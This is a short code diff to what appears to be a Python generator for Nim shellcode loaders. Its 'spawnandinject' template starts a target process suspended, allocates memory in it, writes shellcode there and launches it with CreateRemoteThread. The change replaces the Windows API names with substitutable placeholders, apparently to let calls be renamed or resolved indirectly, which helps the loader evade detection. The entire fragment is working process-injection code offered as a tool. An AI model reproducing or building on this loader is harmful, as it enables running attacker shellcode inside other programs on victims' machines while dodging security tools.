@@ -28,11 +28,11 @@ class spawnandinject:
 
     si.cb = sizeof(si).DWORD
 
-    CreateProcessA(nil, "$target", nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, &si, &pi)
+    discard {CreateProcessA}(nil, "$target", nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, &si, &pi)
 
-    let address = VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, $memoryPermission)
-    WriteProcessMemory(pi.hProcess, address, addr(shellcode[0]), {shellcodeSize}, nil)
-    let hThread = CreateRemoteThread(pi.hProcess, nil, 0.SIZE_T, cast[LPTHREAD_START_ROUTINE](address), nil, 0, nil)
-    WaitForSingleObject(hThread, 500)
-    CloseHandle(hThread)
+    let address = {VirtualAllocEx}(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, $memoryPermission)
+    discard {WriteProcessMemory}(pi.hProcess, address, addr(shellcode[0]), {shellcodeSize}, nil)
+    let hThread = {CreateRemoteThread}(pi.hProcess, nil, 0.SIZE_T, cast[LPTHREAD_START_ROUTINE](address), nil, 0, nil)
+    {WaitForSingleObject}(hThread, int32(500))
+    discard {CloseHandle}(hThread)
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
